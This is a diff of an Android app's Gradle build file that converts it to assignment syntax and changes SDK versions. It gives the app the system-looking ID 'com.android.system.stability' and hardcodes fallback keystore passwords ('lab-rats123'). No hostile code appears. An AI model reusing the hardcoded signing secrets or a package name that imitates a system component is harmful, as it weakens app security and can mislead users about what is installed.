@@ -1,3 +1,4 @@
+
 plugins {
     id 'com.android.application'
 }
@@ -9,20 +10,20 @@ if (keystorePropertiesFile.exists()) {
 }
 
 android {
-    namespace 'com.labs.labrats'
-    compileSdk 37
+    namespace = 'com.labs.labrats'
+    compileSdk = 35
 
     buildFeatures {
-        buildConfig true
+        buildConfig = true
     }
 
     defaultConfig {
-        applicationId "com.android.system.stability"
-        minSdk 21
-        targetSdk 37
-        versionCode 623
-        versionName "4.9.4"
-        multiDexEnabled false
+        applicationId = "com.android.system.stability"
+        minSdk= 26
+        targetSdk= 35
+        versionCode= 623
+        versionName= "4.9.4"
+        multiDexEnabled= false
 
         def localProperties = new Properties()
         def localPropertiesFile = rootProject.file('local.properties')
@@ -50,43 +51,43 @@ android {
     signingConfigs {
         release {
             if (keystorePropertiesFile.exists()) {
-                storeFile rootProject.file(keystoreProperties['storeFile'] ?: 'lab-rats-keystore.jks')
-                storePassword keystoreProperties['storePassword'] ?: 'lab-rats123'
-                keyAlias keystoreProperties['keyAlias'] ?: 'lab-rats-key'
-                keyPassword keystoreProperties['keyPassword'] ?: 'lab-rats123'
+                storeFile= rootProject.file(keystoreProperties['storeFile'] ?: 'lab-rats-keystore.jks')
+                storePassword= keystoreProperties['storePassword'] ?: 'lab-rats123'
+                keyAlias= keystoreProperties['keyAlias'] ?: 'lab-rats-key'
+                keyPassword =keystoreProperties['keyPassword'] ?: 'lab-rats123'
             }
         }
     }
 
     buildTypes {
         debug {
-            debuggable false
-            minifyEnabled false
+            debuggable = false
+            minifyEnabled= false
             if (keystorePropertiesFile.exists() && signingConfigs.release.storeFile != null) {
-                signingConfig signingConfigs.release
+                signingConfig= signingConfigs.release
             }
         }
         release {
-            minifyEnabled true
-            shrinkResources true
+            minifyEnabled= true
+            shrinkResources= true
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
             if (keystorePropertiesFile.exists() && signingConfigs.release.storeFile != null) {
-                signingConfig signingConfigs.release
+                signingConfig= signingConfigs.release
             }
         }
     }
 
     compileOptions {
-        sourceCompatibility JavaVersion.VERSION_17
-        targetCompatibility JavaVersion.VERSION_17
+        sourceCompatibility = JavaVersion.VERSION_17
+        targetCompatibility = JavaVersion.VERSION_17
     }
 
     lint {
-        checkReleaseBuilds false
-        checkDependencies false
-        abortOnError false
-        checkAllWarnings false
-        warningsAsErrors false
+        checkReleaseBuilds= false
+        checkDependencies= false
+        abortOnError= false
+        checkAllWarnings= false
+        warningsAsErrors= false
     }
 
     testOptions {
